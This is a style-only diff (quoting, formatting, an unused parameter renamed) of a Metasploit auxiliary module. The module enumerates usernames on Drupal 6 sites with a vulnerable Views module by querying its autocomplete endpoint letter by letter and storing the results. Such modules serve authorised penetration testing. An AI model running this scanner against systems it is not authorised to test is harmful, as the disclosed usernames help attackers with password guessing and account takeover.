@@ -10,43 +10,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Drupal Views Module Users Enumeration',
-      'Description'    => %q{
-        This module exploits an information disclosure vulnerability in the 'Views'
-        module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'.
-        Drupal 6 with 'Views' module <= 6.x-2.11 are vulnerable.  Drupal does not
-        consider disclosure of usernames as a weakness.
-      },
-      'Author'         =>
-        [
-          'Justin Klein Keane', #Original Discovery
+    super(
+      update_info(
+        info,
+        'Name' => 'Drupal Views Module Users Enumeration',
+        'Description' => %q{
+          This module exploits an information disclosure vulnerability in the 'Views'
+          module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'.
+          Drupal 6 with 'Views' module <= 6.x-2.11 are vulnerable.  Drupal does not
+          consider disclosure of usernames as a weakness.
+        },
+        'Author' => [
+          'Justin Klein Keane', # Original Discovery
           'Robin Francois <rof[at]navixia.com>',
           'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['URL', 'http://www.madirish.net/node/465'],
           ['URL', 'https://www.drupal.org/node/1004778'],
         ],
-      'DisclosureDate' => '2010-07-02'
-    ))
+        'DisclosureDate' => '2010-07-02'
+      )
+    )
 
     register_options(
       [
-        OptString.new('TARGETURI', [true, "Drupal Path", "/"])
-      ])
+        OptString.new('TARGETURI', [true, 'Drupal Path', '/'])
+      ]
+    )
   end
 
   def base_uri
     @base_uri ||= normalize_uri("#{target_uri.path}/?q=admin/views/ajax/autocomplete/user/")
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     res = send_request_cgi(
-      'uri'     => base_uri,
-      'method'  => 'GET',
+      'uri' => base_uri,
+      'method' => 'GET',
       'headers' => { 'Connection' => 'Close' }
     )
 
@@ -56,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
 
     if res.body.include?('Access denied')
       # This probably means the Views Module actually isn't installed
-      print_error("Access denied")
+      print_error('Access denied')
       return Exploit::CheckCode::Safe
     elsif res.message != 'OK' || res.body != '[  ]'
       return Exploit::CheckCode::Safe
@@ -103,8 +105,8 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("Iterating on letter: #{l}")
 
       res = send_request_cgi(
-        'uri'     => "#{base_uri}#{l}",
-        'method'  => 'GET',
+        'uri' => "#{base_uri}#{l}",
+        'method' => 'GET',
         'headers' => { 'Connection' => 'Close' }
       )
 
@@ -122,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
           results << user_list.flatten.uniq
         end
       else
-        print_error("Unexpected results from server")
+        print_error('Unexpected results from server')
         return
       end
     end
@@ -139,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
       )
     end
 
-    results = results * "\n"
+    results *= "\n"
     p = store_loot(
       'drupal_user',
       'text/plain',
